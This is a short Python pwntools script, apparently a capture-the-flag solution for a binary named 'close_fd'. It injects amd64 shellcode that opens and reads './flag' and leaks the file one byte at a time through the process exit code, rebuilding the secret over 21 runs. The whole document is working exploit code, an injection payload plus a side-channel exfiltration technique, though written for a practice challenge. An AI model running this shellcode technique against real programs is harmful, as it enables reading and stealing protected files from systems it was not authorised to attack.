from pwn import *

context.arch = 'amd64'

result = ''

for i in range(21):
	io = process('./close_fd')
	#gdb.attach(io)
	
	shellcode = '''
	mov rax, %d
	push rax

	mov rdi, rsp
	mov rsi, 0
	mov rdx, 0
	mov rax, 0x2
	syscall

	mov rdi, rax
	mov rsi, 0x16051500
	mov rdx, 0x50
	mov rax, 0x0
	syscall

	mov edi, DWORD PTR [0x16051500 + %d]
	mov rax, 0x3c
	syscall
	''' % (u64('./flag\0\0'), i)

	io.sendline(asm(shellcode))
	
	result += chr(io.poll(block=True))

	io.close()

print(result)
